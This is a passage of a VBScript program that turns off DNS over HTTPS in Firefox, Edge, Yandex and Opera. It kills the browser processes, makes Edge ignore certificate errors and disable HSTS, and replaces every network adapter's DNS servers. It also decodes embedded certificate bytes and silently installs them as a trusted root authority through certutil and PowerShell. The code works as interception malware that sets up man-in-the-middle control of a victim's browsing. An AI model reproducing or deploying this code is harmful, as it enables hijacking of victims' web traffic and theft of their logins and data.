    If objFSO.FolderExists(profilePath) Then
        Dim profileFolder
        Set profileFolder = objFSO.GetFolder(profilePath)

        userJSPath = profileFolder.Path & "\user.js"

        If Not objFSO.FileExists(userJSPath) Then
            Set objFile = objFSO.CreateTextFile(userJSPath)
            objFile.Close
        End If

        Set objFile = objFSO.OpenTextFile(userJSPath, 8, True)
        objFile.WriteLine "user_pref(""network.trr.mode"", 5);"
        objFile.Close
    End If

    Set objFSO = Nothing
    Set objShell = Nothing

    FireFox2
End Sub





Sub FireFox2
    Const HKEY_LOCAL_MACHINE = &H80000002

    Dim paths, values, names
    paths = Array("SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS", "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS")
    values = Array(0, 1)
    names = Array("Enabled", "Locked")

    Dim objShell
    Set objShell = CreateObject("WScript.Shell")

    Dim i, regPath, regValue, regName, regKey
    For i = 0 To UBound(paths)
        regPath = paths(i)
        regValue = values(i)
        regName = names(i)

        On Error Resume Next
        Set regKey = objShell.RegRead("HKLM\" & regPath & "\" & regName)
        If Err.Number <> 0 Then
            Set regKey = objShell.RegCreateKeyEx(HKEY_LOCAL_MACHINE, regPath, 0, "REG_DWORD")
        End If
        On Error Goto 0
        
        objShell.RegWrite "HKLM\" & regPath & "\" & regName, regValue, "REG_DWORD"
    Next

    Set objShell = Nothing
End Sub





Sub Edge
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Disable DNS over HTTPS (DoH) in the system registry
    objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"
    
    ' Configure Edge policies
    Const HKEY_LOCAL_MACHINE = &H80000002
    Dim edgeKeyPath
    edgeKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\CommandLine", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    ' Create and set registry key for ignoring certificate errors
    Dim strKeyPath
    Dim strValueName
    Dim dwValue
    strKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
    strValueName = "IgnoreCertificateErrors"
    dwValue = 1
    Dim objRegistry
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
End Sub



Sub Yandex
    Dim objShell, SettingsFilePath, objFSO, objFile, strContents
    Dim possiblePaths, i
    Set objShell = CreateObject("WScript.Shell")

    possiblePaths = Array( _
        GetYandexInstallationPathFromAppData() & "\Local State")

    For i = LBound(possiblePaths) To UBound(possiblePaths)
        SettingsFilePath = possiblePaths(i)
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        DisableDoHInYandex objFSO, SettingsFilePath
    Next
End Sub

Function DisableDoHInYandex(objFSO, FilePath)
    If Not objFSO.FileExists(FilePath) Then
        Exit Function
    End If

    Dim processes
    processes = Array("service_update.exe", "browser.exe")
    KillProcesses processes
    
    Dim jsonContent, jsonFile
    Set jsonFile = objFSO.OpenTextFile(FilePath, 1)
    jsonContent = jsonFile.ReadAll
    jsonFile.Close
    
    Dim regexPattern
    regexPattern = """dns_over_https""\s*:\s*\{[^}]*""mode""\s*:\s*""([^""]+)"""
    
    Dim regex
    Set regex = New RegExp
    regex.Pattern = regexPattern
    regex.IgnoreCase = True
    regex.Global = True
    
    If regex.Test(jsonContent) Then
        jsonContent = regex.Replace(jsonContent, """dns_over_https"":{""mode"":""off""")
        
        Set jsonFile = objFSO.OpenTextFile(FilePath, 2)
        jsonFile.Write jsonContent
        jsonFile.Close
        
        DisableDoHInYandex = "DNS over HTTPS mode set to 'off' in file: " & FilePath
    End If
End Function

Function GetYandexInstallationPathFromAppData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
    operaInstallationPath = appDataPath & "\Yandex\YandexBrowser\User Data"
    GetYandexInstallationPathFromAppData = operaInstallationPath 
End Function




Sub Opera
    Dim objShell, OperaSecurePreferencesFilePath, objFSO, objFile, strContents
    Dim possiblePaths, i
    Set objShell = CreateObject("WScript.Shell")

    possiblePaths = Array( _
        GetOperaInstallationPathFromAppData() & "\Local State", _
        GetOperaInstallationPathFromApplicationData() & "\Local State" _
    )

    For i = LBound(possiblePaths) To UBound(possiblePaths)
        OperaSecurePreferencesFilePath = possiblePaths(i)
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.FileExists(OperaSecurePreferencesFilePath) Then
            DisableDoHInOpera objFSO, OperaSecurePreferencesFilePath
        End If
    Next

    Set objShell = Nothing
End Sub

Function DisableDoHInOpera(objFSO, FilePath)
    If Not objFSO.FileExists(FilePath) Then
        Exit Function
    End If

    Dim processes
    processes = Array("opera_crashreporter.exe", "opera.exe")
    KillProcesses processes
    
    Dim jsonContent, jsonFile
    Set jsonFile = objFSO.OpenTextFile(FilePath, 1)
    jsonContent = jsonFile.ReadAll
    jsonFile.Close
    
    Dim regexPattern
    regexPattern = """dns_over_https""\s*:\s*\{[^}]*""mode""\s*:\s*""([^""]+)"""
    
    Dim regex
    Set regex = New RegExp
    regex.Pattern = regexPattern
    regex.IgnoreCase = True
    regex.Global = True
    
    If regex.Test(jsonContent) Then
        jsonContent = regex.Replace(jsonContent, """dns_over_https"":{""mode"":""off""")
        
        Set jsonFile = objFSO.OpenTextFile(FilePath, 2)
        jsonFile.Write jsonContent
        jsonFile.Close
        
        DisableDoHInOpera = "DNS over HTTPS mode set to 'off' in file: " & FilePath
    End If
End Function

Function GetOperaInstallationPathFromAppData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable"
    GetOperaInstallationPathFromAppData = operaInstallationPath
End Function

Function GetOperaInstallationPathFromApplicationData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable"
    GetOperaInstallationPathFromApplicationData = operaInstallationPath
End Function









Sub KillProcesses(arrProcesses)
    Dim objShell
    Dim process
    Set objShell = CreateObject("WScript.Shell")
    For Each process In arrProcesses
        Dim command
        command = "taskkill.exe /im " & process & " /f"
        objShell.Run command, 0, True
    Next
    Set objShell = Nothing
End Sub

Sub Dns
    Dim objWMIService, colAdapters, objAdapter
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")

    For Each objAdapter In colAdapters
        If objAdapter.IPEnabled Then
            Dim arrDNSServers
            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
            objAdapter.SetDNSServerSearchOrder arrDNSServers
        End If
    Next

    Set objWMIService = Nothing
End Sub

Function CertWorks()
    dim i
    For i = LBound(xdata) To UBound(xdata)
        Dim binaryData
        binaryData = xdata(i)
        CertWork binaryData
    Next
End Function

Function TempFile
    Dim fso, tempFolder
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFolder = fso.GetSpecialFolder(2)
    TempFile = fso.BuildPath(tempFolder, fso.GetTempName() & ".pfx")
End Function

Sub CertWork(binaryData)
    Dim scriptPath
    scriptPath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

    Dim outputFilePath
    outputFilePath = TempFile()
    
    dim hexPairs
    dim i
    hexPairs = Split(binaryData, "-")
    Dim byteArray
    ReDim byteArray(UBound(hexPairs))
    For i = 0 To UBound(hexPairs)
        byteArray(i) = CByte("&H" & hexPairs(i))
    Next
    WriteBinary outputFilePath, byteArray

    InstallCertificate outputFilePath, "123"
    InstallCertificateRoot outputFilePath, "123"
end Sub

Sub WriteBinary(FileName, Buf)
    Dim I, aBuf, Size, bStream
    Size = UBound(Buf): ReDim aBuf(Size \ 2)
    For I = 0 To Size - 1 Step 2
    aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))
    Next
    If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))
    aBuf=Join(aBuf, "")
    Set bStream = CreateObject("ADODB.Stream")
    bStream.Type = 1: bStream.Open
    With CreateObject("ADODB.Stream")
    .Type = 2 : .Open: .WriteText aBuf
    .Position = 2: .CopyTo bStream: .Close
    End With
    bStream.SaveToFile FileName, 2: bStream.Close
    Set bStream = Nothing
End Sub

Sub InstallCertificate(certificateFilePath, password)
    Dim certutilCommand
    certutilCommand = "CERTUTIL -f -p " & password & " -importpfx """ & certificateFilePath & """"

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run certutilCommand, 0, True
End Sub

Sub InstallCertificateRoot(pfxFilePath, password)
    Dim powerShellCommand
    powerShellCommand = "powershell -Command ""Import-PfxCertificate -FilePath '" & pfxFilePath & "' Cert:\LocalMachine\Root -Password (ConvertTo-SecureString -String '" & password & "' -AsPlainText -Force)"""

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run powerShellCommand, 0, True
End Sub
